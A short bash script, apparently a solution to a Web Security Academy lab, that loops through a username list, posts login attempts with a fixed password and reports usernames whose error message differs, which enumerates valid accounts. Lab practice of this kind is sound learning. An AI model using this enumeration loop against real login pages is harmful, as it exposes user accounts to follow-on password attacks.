#!/usr/bin/env bash

HOST="0a13002a04343cd980e4f4ae00a700cf.web-security-academy.net"
INVALID_USER_MSG="Invalid username or password."

while IFS= read -r username; do
  msg=$(
    curl -s -X POST "https://$HOST/login" \
      --data-urlencode "username=$username" \
      --data-urlencode "password=test123" \
      | grep -oP '<p class=is-warning>\K.*(?=</p>)'
  )

  if [[ "$msg" != "$INVALID_USER_MSG" ]]; then
    echo "[+] Possible valid username found: $username"
    echo "[+] Response: '$msg'"
  fi
done < user_list.txt
